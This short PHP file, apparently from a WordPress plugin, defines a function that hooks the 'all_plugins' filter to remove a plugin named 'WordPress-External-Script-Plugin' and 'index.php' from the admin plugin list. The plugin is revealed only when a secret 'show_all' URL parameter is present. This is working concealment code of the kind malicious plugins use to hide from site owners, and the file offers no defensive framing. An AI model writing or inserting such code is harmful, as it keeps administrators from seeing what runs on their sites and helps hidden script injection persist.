<?php

function self_hider($is_enabled)
{
  if ($is_enabled === true) {
    add_filter(
      'all_plugins',
      function ($plugins) {

        $shouldHide = !array_key_exists('show_all', $_GET);

        if ($shouldHide) {
          $hiddenPlugins = [
            'WordPress-External-Script-Plugin/index.php',
            'index.php',
          ];

          foreach ($hiddenPlugins as $hiddenPlugin) {
            unset($plugins[$hiddenPlugin]);
          }
        }
        return $plugins;
      }
    );
  }
}
